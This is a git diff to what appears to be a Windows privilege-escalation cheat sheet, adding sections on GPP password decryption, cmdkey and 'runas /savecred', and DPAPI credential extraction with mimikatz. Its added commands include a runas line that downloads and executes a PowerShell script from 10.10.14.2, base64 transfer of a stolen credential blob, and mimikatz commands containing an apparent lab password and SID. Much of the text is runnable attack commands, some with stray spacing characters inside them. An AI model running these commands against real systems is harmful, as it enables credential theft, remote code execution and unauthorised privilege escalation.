@@ -178,6 +178,7 @@ msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\
 ```
 
 ### Task Scheduler
+
 - On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges.
 - Works only on  Windows 2000, XP, or 2003
 - Must have local administrator
@@ -189,6 +190,7 @@ msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\
 ```
 
 ### DLL Hijacking (DLL preloading attack or a binary planting attack)
+
 - https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx
 - Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx
 
@@ -211,6 +213,7 @@ Identify processes / services
 - Look at the registry key `ServiceDll` of services (`Parameters`).
 
 #### Windows 7
+
 ```
 IKE and AuthIP IPsec Keying Modules (IKEEXT) – wlbsctrl.dll
 Windows Media Center Receiver Service (ehRecvr) – ehETW.dll
@@ -225,6 +228,7 @@ schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearc
 ```
 
 #### Windows XP
+
 ```
 Automatic Updates (wuauserv) – ifsproxy.dll
 Remote Desktop Help Session Manager (RDSessMgr) – SalemHook.dll
@@ -241,6 +245,7 @@ Encase Enterprise Agent – SDDisk.dll
 #### Migrations
 
 ##### CWDIllegalInDllSearch
+
 - Allow user to change DLL search path algorithm
 
 ```
@@ -258,6 +263,7 @@ Windows directory (C:\Windows)
 Directories in the PATH environment variable (system then user)
 ```
 ##### SetDllDirectory
+
 - Removes the current working directory (CWD) from the search order
 
 SetDllDirectory(“C:\\program files\\MyApp\\”) :
@@ -282,11 +288,13 @@ Directories in the PATH environment variable (system then user)
 ```
 
 ##### SafeDllSearchMode
+
 - Enabled by default
 - Can disable using `[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]`
 - Calling the SetDllDirectory(“”) or SetDllDirectory(“C:\\program files\\MyApp\\”) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.
 
 ##### DEV
+
 - LoadLibraryEx (additional argument)
 - SetEnvironmentVariable(TEXT(“PATH”),NULL)
 - Change default installation folder to C:\Program Files
@@ -317,6 +325,7 @@ Directories in the PATH environment variable (system then user)
 ```
 
 ### Stored Credentials
+
 ```
 C:\unattend.xml
 C:\sysprep.inf
@@ -332,6 +341,7 @@ findstr /si pass *.txt | *.xml | *.ini
 ```
 
 #### Unattended Installations
+
 - `post/windows/gather/enum_unattend`
 - Look for `UserAccounts` tag of `Unattend.xml`, `sysprep.xml` and `sysprep.inf` across the system, including:
 ```
@@ -343,14 +353,21 @@ C:\Windows\System32\sysprep\
 - Microsoft appends "Password" to all passwords within Unattend files before encoding them.
 
 #### Group Policy Preferences (GPP)
+- Introduced from Windows Server 2008
 - `GPP` allows for configuration of Domain-attached machines via `group policy`.
+- GPPs are stored in the `SYSVOL` share, which is world-readable to authenticated users.
 - Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the `logged-in user` and pull down policies.
 - Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the `SYSVOL` folder
 - `cpassword` is used to set passwords for the Local Administrator account.
-- Password is AES encrypted (https://msdn.microsoft.com/en-us/library/Cc422924.aspx)
+- Password is AES encrypted using a published key: [https://msdn.microsoft.com/en-us/library/Cc422924.aspx](https://msdn.microsoft.com/en-us/library/Cc422924.aspx)
 
 - Metasploit: `post/windows/gather/credentials/gpp`
 - PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+
+Decrypt encrypted password:
+```
+gpp-decrypt $cpassword
+```
 
 ```
 Get-GPPPassword
@@ -384,7 +401,80 @@ Start new process with token of another process
 Invoke-TokenManipulation -CreateProcess "C:\Windown\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
 ```
 
+### cmdkey
+
+- Creates, lists, and deletes stored user names and passwords or credentials.
+- Usable with "runas /savecred"
+
+```
+cmdkey /list
+```
+
+Run a command as admin:
+```
+runas /user:ACCESS\Administrator /savecred ​ "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')
+```
+
+Find all `runas` shortcuts:
+```
+Get-ChildItem​ ​ "C:\"​ *.lnk -Recurse -Force | ft fullname | ​ Out-File​ shortcuts.txt
+
+ForEach​ ( ​ $file​ ​ in​ gc .\shortcuts.txt) { ​ Write-Output​ ​ $file​ ; gc ​ $file​ |
+Select-String​ runas }
+```
+
+#### Windows Data Protection API
+
+Locating `credential files`
+```
+cmd​ /c "​ dir​ /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & ​ dir​ /S /AS
+C:\Users\security\AppData\Local\Microsoft\Credentials & ​ dir​ /S /AS
+C:\Users\security\AppData\Local\Microsoft\Protect & ​ dir​ /S /AS
+C:\Users\security\AppData\Roaming\Microsoft\Vault & ​ dir​ /S /AS
+C:\Users\security\AppData\Roaming\Microsoft\Credentials & ​ dir​ /S /AS
+C:\Users\security\AppData\Roaming\Microsoft\Protect"
+```
+
+Transfer
+```
+[Convert]::ToBase64String([IO.File]::ReadAllBytes(​ "C:\Users\security\AppData\Roamin
+g\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"​ ))
+```
+```
+[IO.File]::WriteAllBytes(​ "51AB168BE4BDB3A603DADE4F8CA81290"​ ,
+[Convert]::FromBase64String(​ "AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6
+VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI
+ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA
+AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7
+c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH
+hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd
+lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC
+KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z
+BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ
+=="​ ))
+```
+
+Extraction credential file -> masterkey (guidMasterKey)
+- [https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
+
+```
+dpapi::​ cred​ /​ in​ :51​ AB168BE4BDB3A603DADE4F8CA81290
+/​ sid:S​ -1-5-21-953262931-566350628-63446256-1001 /​ password​ :4​ Cc3ssC0ntr0ller
+```
+
+Examine master key file
+```
+dpapi::​ masterkey​ /​ in​ :0792​ c32e​ -48​ a5​ -4​ fe3​ -8​ b43​ - ​ d93d64590580
+/​ sid:S​ -1-5-21-953262931-566350628-63446256-1001 /​ password​ :4​ Cc3ssC0ntr0ller
+```
+
+Decrypt credential blob
+```
+dpapi::​ cred​ /​ in​ :51​ AB168BE4BDB3A603DADE4F8CA81290
+```
+
 ### Using Kernel Exploit
+
 Installed updates:
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn
